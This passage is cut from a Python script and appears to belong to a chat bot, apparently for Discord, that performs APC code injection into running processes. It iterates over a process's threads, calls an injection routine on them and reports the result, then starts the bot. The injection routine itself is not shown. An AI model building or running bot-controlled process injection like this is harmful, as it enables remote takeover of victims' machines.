            for tid in thread_in_process(hSnapshot, pid):
                tids.append(tid)
            score = do_the_apc_inject(pid, tids)
            if score < 0:
                print('Unable to inject on {} pid {}'.format(proc, pid))
            else:
                print('Injected on {},{},{} threads'.format(proc, pid, score))

    CloseHandle(hSnapshot)

bot.run(TOKEN)